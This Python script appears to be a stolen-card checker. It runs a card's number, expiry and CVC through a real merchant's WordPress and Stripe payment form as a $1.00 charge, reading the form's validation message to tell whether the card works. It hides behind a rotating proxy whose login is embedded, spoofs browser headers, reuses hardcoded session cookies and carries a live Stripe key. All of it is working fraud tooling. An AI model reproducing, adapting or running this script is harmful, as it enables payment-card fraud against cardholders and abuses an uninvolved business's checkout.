import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	url = "https://nvservicegroup.com/make-a-payment-to-your-account/"
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'authority': "nvservicegroup.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'cache-control': "max-age=0",
	  'referer': "https://www.google.com/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "document",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-user': "?1",
	  'upgrade-insecure-requests': "1"
	}
	
	response = session.get(url, headers=headers)
	
	nonce = re.search(r'"create_payment_intent_nonce":"(.*?)"', response.text).group(1)
	#print(nonce)
	hash = re.search(r"&amp;hash=(.*?)'", response.text).group(1)
	#print(hash)
	state_39 = re.search(r"name='state_39' value='(.*?)'", response.text).group(1)
	#print(state_39)
	version_hash = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
	#print(version_hash)
	
	url = "https://nvservicegroup.com/wp-admin/admin-ajax.php"
	
	payload = {
	  'action': "gfstripe_get_country_code",
	  'nonce': f"{nonce}",
	  'country': "United States",
	  'feed_id': "1"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'authority': "nvservicegroup.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://nvservicegroup.com",
	  'referer': "https://nvservicegroup.com/make-a-payment-to-your-account/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest",
	  'Cookie': "PHPSESSID=tdqlfq71grl25030n8dh8jsscs; _ga=GA1.2.145301398.1747750904; _gid=GA1.2.411854099.1747750904; __stripe_mid=26623e0e-4f71-41b8-b563-1f4a0f30087714af51; __stripe_sid=aac569bf-ff96-4eb7-9118-fc92598a206ea7e405; _ga_RDYCLJRJ2Q=GS2.1.s1747750903$o1$g0$t1747750914$j0$l0$h0"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	url = "https://api.stripe.com/v1/payment_methods"
	
	payload = {
	  'type': "card",
	  'billing_details[name]': "Dao Khao Saard",
	  'billing_details[address][line1]': "Street 27",
	  'billing_details[address][city]': "New York",
	  'billing_details[address][state]': "New York",
	  'billing_details[address][postal_code]': "10080",
	  'billing_details[address][country]': "US",
	  'card[number]': f"{n}",
	  'card[cvc]': f"{cvc}",
	  'card[exp_month]': "{mm}",
	  'card[exp_year]': "{yy}",
	  'payment_user_agent': "stripe.js/2b425ea933; stripe-js-v3/2b425ea933; card-element",
	  'key': "pk_live_51K9BcCB8pyVHbV7QSUIPTC33ouoGeJB1GwwpW3JokvIerIN0WuJ5lpNBmEo6DCGNH53eeWoJ59KJ1kBYI7dbqEd900ZjSCliTr",
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'authority': "api.stripe.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://js.stripe.com",
	  'referer': "https://js.stripe.com/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-site"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	brand = re.search(r'"brand": "(.*?)"', response.text).group(1)
	funding = re.search(r'"funding": "(.*?)"', response.text).group(1)
	last4 = re.search(r'"last4": "(.*?)"', response.text).group(1)
	created = response.json()['created']
	pm = response.json()['id']
	
	#print(brand,funding,last4,created,pm)
	
	url = "https://nvservicegroup.com/wp-admin/admin-ajax.php"
	
	payload = {
	  'action': "gfstripe_create_payment_intent",
	  'nonce': f"{nonce}",
	  'payment_method[id]': f"{pm}",
	  'payment_method[object]': "payment_method",
	  'payment_method[allow_redisplay]': "unspecified",
	  'payment_method[billing_details][address][city]': "New York",
	  'payment_method[billing_details][address][country]': "US",
	  'payment_method[billing_details][address][line1]': "Street 27",
	  'payment_method[billing_details][address][line2]': "",
	  'payment_method[billing_details][address][postal_code]': "10080",
	  'payment_method[billing_details][address][state]': "New York",
	  'payment_method[billing_details][email]': "",
	  'payment_method[billing_details][name]': "Dao Khao Saard",
	  'payment_method[billing_details][phone]': "",
	  'payment_method[billing_details][tax_id]': "",
	  'payment_method[card][brand]': f"{brand}",
	  'payment_method[card][checks][address_line1_check]': "",
	  'payment_method[card][checks][address_postal_code_check]': "",
	  'payment_method[card][checks][cvc_check]': "",
	  'payment_method[card][country]': "US",
	  'payment_method[card][display_brand]': f"{brand}",
	  'payment_method[card][exp_month]': f"{mm}",
	  'payment_method[card][exp_year]': f"20{yy}",
	  'payment_method[card][funding]': f"{funding}",
	  'payment_method[card][generated_from]': "",
	  'payment_method[card][last4]': f"{last4}",
	  'payment_method[card][networks][available][]': f"{brand}",
	  'payment_method[card][networks][preferred]': "",
	  'payment_method[card][regulated_status]': "regulated",
	  'payment_method[card][three_d_secure_usage][supported]': "true",
	  'payment_method[card][wallet]': "",
	  'payment_method[created]': f"{created}",
	  'payment_method[customer]': "",
	  'payment_method[livemode]': "true",
	  'payment_method[type]': "card",
	  'currency': "USD",
	  'amount': "100",
	  'feed_id': "1"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/javascript, */*; q=0.01",
	  'authority': "nvservicegroup.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://nvservicegroup.com",
	  'referer': "https://nvservicegroup.com/make-a-payment-to-your-account/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest",
	  'Cookie': "PHPSESSID=tdqlfq71grl25030n8dh8jsscs; _ga=GA1.2.145301398.1747750904; _gid=GA1.2.411854099.1747750904; __stripe_mid=26623e0e-4f71-41b8-b563-1f4a0f30087714af51; __stripe_sid=aac569bf-ff96-4eb7-9118-fc92598a206ea7e405; _ga_RDYCLJRJ2Q=GS2.1.s1747750903$o1$g0$t1747750914$j0$l0$h0"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	pi = re.search(r'"id":"(.*?)"', response.text).group(1)
	secret = re.search(r'"client_secret":"(.*?)"', response.text).group(1)
	#print(pi,secret)
	
	url = "https://nvservicegroup.com/make-a-payment-to-your-account/"
	
	payload = {
	  'input_21': '$1.00',
	  'input_1': '1',
	  'input_4': 'Rodam User',
	  'input_27.1': 'Street 27',
	  'input_27.3': 'New York',
	  'input_27.4': 'New York',
	  'input_27.5': '10080',
	  'input_27.6': 'United States',
	  'input_12': 'rodamuser08@gmail.com',
	  'input_26.5': 'Dao Khao Saard',
	  'input_18': '',
	  'input_29': '',
	  'gform_ajax': f'form_id=39&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={hash}',
	  'gform_submission_method': 'iframe',
	  'gform_theme': 'gravity-theme',
	  'gform_style_settings': '[]',
	  'is_submit_39': '1',
	  'gform_submit': '39',
	  'gform_unique_id': '',
	  'state_39': f'{state_39}',
	  'gform_target_page_number_39': '0',
	  'gform_source_page_number_39': '1',
	  'gform_field_values': '',
	  'version_hash': f'{version_hash}',
	  'stripe_response': '{"id":"'+str(pi)+'","client_secret":"'+str(secret)+'","amount":100}',
	  'stripe_credit_card_last_four': f'{last4}',
	  'stripe_credit_card_type': f'{brand}'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'authority': "nvservicegroup.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'cache-control': "max-age=0",
	  'origin': "https://nvservicegroup.com",
	  'referer': "https://nvservicegroup.com/make-a-payment-to-your-account/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "iframe",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-site': "same-origin",
	  'upgrade-insecure-requests': "1",
	  'Cookie': "PHPSESSID=tdqlfq71grl25030n8dh8jsscs; _ga=GA1.2.145301398.1747750904; _gid=GA1.2.411854099.1747750904; __stripe_mid=26623e0e-4f71-41b8-b563-1f4a0f30087714af51; __stripe_sid=aac569bf-ff96-4eb7-9118-fc92598a206ea7e405; _ga_RDYCLJRJ2Q=GS2.1.s1747750903$o1$g1$t1747750980$j0$l0$h0"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	try:
		result = re.search(r"class='gfield_description validation_message gfield_validation_message'>(.*?)</div>", response.text).group(1)
	except:
		result = response.text
		
	return (result)
